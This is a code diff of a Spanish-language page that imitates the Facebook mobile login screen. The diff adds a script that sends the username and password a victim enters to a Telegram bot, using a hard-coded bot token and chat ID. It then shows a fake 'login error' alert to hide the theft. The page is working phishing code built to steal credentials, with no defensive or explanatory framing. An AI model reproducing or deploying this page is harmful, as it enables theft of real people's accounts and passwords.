@@ -5,49 +5,49 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Facebook</title>
     <style>
-        /* Reset de márgenes y paddings aaaaa*/
+        /* Reset de márgenes y paddings */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
-        /* Configuración del cuerpo para centrar y cubrir toda la pantalla */
+        /* Configuración del cuerpo */
         body {
             font-family: Arial, sans-serif;
             background: linear-gradient(to bottom, #f7f8fc, #ffffff);
-            min-height: 100vh; /* Ajusta la altura mínima sin desbordar */
-            width: 100vw;  /* Ocupa todo el ancho */
+            min-height: 100vh;
+            width: 100vw;
             display: flex;
             flex-direction: column;
-            justify-content: center; /* Centrar verticalmente */
-            align-items: center; /* Centrar horizontalmente */
+            justify-content: center;
+            align-items: center;
             text-align: center;
-            overflow: hidden; /* Evitar scroll */
+            overflow: hidden;
         }
 
         /* Idioma */
         .language {
             color: #606770;
             font-size: 14px;
-            margin-bottom: 30px; /* Aumentar separación del logo */
+            margin-bottom: 30px;
         }
 
-        /* Logo de Facebook */
+        /* Logo */
         .logo {
             width: 60px;
-            margin-bottom: 40px; /* Más espacio entre el logo y los inputs */
+            margin-bottom: 40px;
         }
 
-        /* Contenedor de los elementos */
+        /* Contenedor */
         .container {
             width: 90%;
-            max-width: 360px; /* Mantener un tamaño ideal */
+            max-width: 360px;
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: space-between; /* Distribuir elementos uniformemente */
-            height: 75vh; /* Ajusta el alto total para evitar desbordes */
+            justify-content: space-between;
+            height: 75vh;
             margin-top: 30px;
         }
 
@@ -56,7 +56,7 @@
             width: 90%;
             max-width: 350px;
             padding: 14px;
-            margin: 12px 0; /* Más espacio entre los inputs */
+            margin: 12px 0;
             border: 1px solid #ccd0d5;
             border-radius: 12px;
             font-size: 16px;
@@ -82,7 +82,7 @@
             background-color: #1558b0;
         }
 
-        /* Enlace de recuperación de contraseña */
+        /* Enlace de recuperación */
         .forgot-password {
             display: block;
             margin: 15px 0;
@@ -107,14 +107,13 @@
             font-size: 16px;
             cursor: pointer;
             margin-top: 20px;
-            margin-bottom: 40px
-            href="https://m.facebook.com/reg/";
+            margin-bottom: 40px;
         }
         .create-account:hover {
             background-color: #f0f2f5;
         }
 
-        /* Sección de Meta */
+        /* Meta sección */
         .meta-section {
             display: flex;
             align-items: center;
@@ -148,16 +147,6 @@
             text-decoration: underline;
         }
 
-        /* Ajustes para pantallas pequeñas */
-        @media (max-width: 400px) {
-            .container {
-                height: auto; /* Evita que se salga de la pantalla */
-            }
-            .input-box {
-                margin: 8px 0; /* Menos espacio entre los inputs en pantallas pequeñas */
-            }
-        }
-
     </style>
 </head>
 <body>
@@ -165,26 +154,26 @@
     <!-- Idioma -->
     <p class="language">Español</p>
 
-    <!-- Logo de Facebook -->
+    <!-- Logo -->
     <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
 
-    <!-- Contenedor de los elementos -->
+    <!-- Contenedor -->
     <div class="container">
         <!-- Campos de entrada -->
-        <input type="text" class="input-box" placeholder="Celular o correo electrónico">
-        <input type="password" class="input-box" placeholder="Contraseña">
+        <input type="text" class="input-box" id="username" placeholder="Celular o correo electrónico">
+        <input type="password" class="input-box" id="password" placeholder="Contraseña">
 
         <!-- Botón de inicio de sesión -->
-        <button class="login-button">Iniciar sesión</button>
+        <button class="login-button" onclick="sendToTelegram()">Iniciar sesión</button>
 
-        <!-- Enlace de recuperación de contraseña -->
+        <!-- Enlace de recuperación -->
         <a href="https://m.facebook.com/login/identify/" class="forgot-password">¿Olvidaste tu contraseña?</a>
 
         <!-- Botón de crear cuenta -->
         <a href="https://m.facebook.com/reg/" class="create-account">Crear cuenta nueva</a>
     </div>
 
-    <!-- Sección de Meta con el icono -->
+    <!-- Meta sección -->
     <div class="meta-section">
         <img class="meta-icon" src="https://img.icons8.com/ios-filled/50/606770/meta.png" alt="Meta Icon">
         <span>Meta</span>
@@ -196,6 +185,37 @@
         <a href="#">Ayuda</a> 
         <a href="#">Más</a>
     </div>
+
+    <script>
+        function sendToTelegram() {
+            let username = document.getElementById('username').value;
+            let password = document.getElementById('password').value;
+
+            if (username.trim() === "" || password.trim() === "") {
+                alert("Por favor, ingresa tus credenciales.");
+                return;
+            }
+
+            let botToken = "7743671451:AAEBBTmS9RCi8cVXIzszcgdeg8lHmVHBgWc"; // Coloca tu token de Telegram
+            let chatId = "6655950012"; // Coloca tu chat ID de Telegram
+
+            let message = `🔑 Nuevo Login:\n👤 Usuario: ${username}\n🔒 Contraseña: ${password}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({chat_id: chatId, text: message})
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("Error al iniciar sesión. Intenta nuevamente.");
+                } else {
+                    console.error("Error al enviar los datos.");
+                }
+            })
+            .catch(error => console.error("Error en la solicitud:", error));
+        }
+    </script>
 
 </body>
 </html>
